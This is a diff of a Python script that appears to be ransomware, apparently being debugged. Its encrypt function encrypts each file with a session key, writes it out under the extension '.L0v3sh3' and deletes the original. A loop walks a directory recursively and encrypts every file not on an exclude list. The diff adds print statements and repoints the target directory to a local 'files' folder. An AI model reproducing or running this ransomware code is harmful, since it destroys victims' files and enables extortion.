@@ -34,6 +34,8 @@ def encrypt(dataFile, publicKey):
     use EAX mode to allow detection of unauthorized modifications
     '''
     # read data from file
+    print("hi1")
+    print(dataFile)
     extension = dataFile.suffix.lower()
     dataFile = str(dataFile)
     with open(dataFile, 'rb') as f:
@@ -55,18 +57,22 @@ def encrypt(dataFile, publicKey):
     ciphertext, tag = cipher.encrypt_and_digest(data)
 
     # save the encrypted data to file
+    print("hi")
+    print(extension)
     fileName= dataFile.split(extension)[0]
+    print(fileName)
     fileExtension = '.L0v3sh3'
     encryptedFile = fileName + fileExtension
     with open(encryptedFile, 'wb') as f:
         [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
     os.remove(dataFile)
+    print("file done")
 
 # change directory to the directory of the script
 # keep secure of changing the directory,
 # DONT RUN THIS SCRIPT ON YOUR PC
-directory = '../' # CHANGE THIS
-excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
+directory = os.getcwd() + '/files' # CHANGE THIS
+excludeExtension = ['.py','.pem', '.exe', '.'] # CHANGE THIS
 for item in scanRecurse(directory): 
     filePath = Path(item)
     fileType = filePath.suffix.lower()
